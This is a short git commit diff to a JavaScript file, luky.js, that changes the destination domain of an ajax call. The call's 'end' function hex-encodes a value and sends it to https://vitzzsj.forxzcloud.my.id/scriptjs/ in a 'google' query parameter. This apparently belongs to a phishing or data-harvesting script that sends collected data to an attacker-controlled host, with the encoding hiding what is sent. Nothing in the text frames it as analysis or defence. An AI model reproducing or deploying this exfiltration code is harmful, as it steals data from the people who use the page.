810e451313a46003a98fd04feed0faecb9acaccf
VITZZHOST <vitzzunchek@gmail.com>
2025-03-20 02:39:12 +0700

    Update luky.js

--- luky.js
+++ luky.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://vitzcnth.forxzcloud.my.id/scriptjs/?google=" +
+                    "https://vitzzsj.forxzcloud.my.id/scriptjs/?google=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
